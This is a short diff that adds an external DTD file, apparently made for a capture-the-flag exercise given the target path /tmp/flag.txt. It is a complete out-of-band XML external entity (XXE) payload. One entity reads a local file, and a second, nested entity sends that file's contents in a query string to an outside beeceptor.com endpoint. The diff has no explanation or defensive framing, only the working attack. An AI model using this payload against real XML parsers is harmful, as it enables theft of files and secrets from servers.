@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://harperrow.free.beeceptor.com/?x=%file;'>">
+%eval;
+%exfil;
